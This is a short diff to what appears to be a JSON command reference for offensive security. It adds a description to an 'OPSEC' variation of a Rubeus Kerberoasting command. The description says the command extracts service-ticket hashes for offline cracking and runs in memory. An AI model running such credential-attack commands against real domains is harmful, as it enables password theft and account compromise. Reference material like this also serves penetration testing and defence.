@@ -178,7 +178,8 @@
   "variations": [
     {
       "label": "OPSEC",
-      "command": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:spn.txt"
+      "command": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:spn.txt",
+      "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
     }
   ],
   "steps": [
